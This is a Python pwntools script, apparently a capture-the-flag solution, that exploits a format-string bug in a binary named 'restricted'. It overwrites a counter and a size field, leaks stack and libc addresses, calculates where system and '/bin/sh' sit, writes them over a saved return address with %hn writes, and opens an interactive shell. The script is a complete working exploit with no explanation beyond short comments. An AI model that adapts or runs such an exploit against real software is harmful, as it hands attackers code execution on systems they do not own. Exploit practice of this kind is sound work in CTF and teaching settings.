#!/usr/bin/env python
from pwn import *

## %2$p   : _IO_2_1_stdin_
## %6$p   : count = 1  -0x80(ebp)
## %7$p   : size  = 8  -0x7c(ebp)
## %8$p   : &count     -0x78(ebp)
## %9$p   : &size      -0x74(ebp)
## %10$p  : hex("%10$")


if len(sys.argv) >= 2 :
    p = remote("ctf.osusec.org", sys.argv[1])
    libc = ELF("./libc6_2.19-0ubuntu6.14_i386.so")
else :
    p = process("./restricted")
    libc = ELF("/lib32/libc.so.6")

p.recvuntil("I'll say it with you...")

## change count to 9 so that we can do format string 8 more times
p.send("%7x%8$n")

## leak stack
p.send("%8$paaa")
p.recvuntil("0x")
leak_stack = p.recvn(8)
ret_addr_store = int(leak_stack, 16) + 0x80 + 0x4       ## -0x80(ebp) -> 4(ebp)
print "safe() ret_addr_store : " +  hex(ret_addr_store)


## leak libc
p.send("%2$paaa")
p.recvuntil("0x")
leak_libc = p.recvn(8)
libc_stdin = int(leak_libc, 16)
print "libc_stdin : " + hex(libc_stdin)
libc_system = libc_stdin + libc.symbols['system'] - libc.symbols['_IO_2_1_stdin_']
libc_binsh  = libc_stdin + next(libc.search("/bin/sh")) - libc.symbols['_IO_2_1_stdin_']


## change the size as large as possible
p.send("%9x%9$n")   ## expand to 9
p.send("%41x%9$n")  ## so we can use 8 of them


## arbitrary write
first  = (libc_system & 0xffff)
second = (0x10000 + (libc_system >> 16) - first ) & 0xffff
payload = "%" + str(first).rjust(6, "0") + "x" + "%0018$hn" \
          + "%" + str(second).rjust(6, "0") + "x" + "%0019$hn" \
          + p32(ret_addr_store) + p32(ret_addr_store+2)
p.send(payload)

## arbitrary write
first  = (libc_binsh & 0xffff)
second = (0x10000 + (libc_binsh >> 16) - first ) & 0xffff
payload = "%" + str(first).rjust(6, "0") + "x" + "%0018$hn" \
          + "%" + str(second).rjust(6, "0") + "x" + "%0019$hn" \
          + p32(ret_addr_store+8) + p32(ret_addr_store+10)
p.send(payload)
p.interactive()
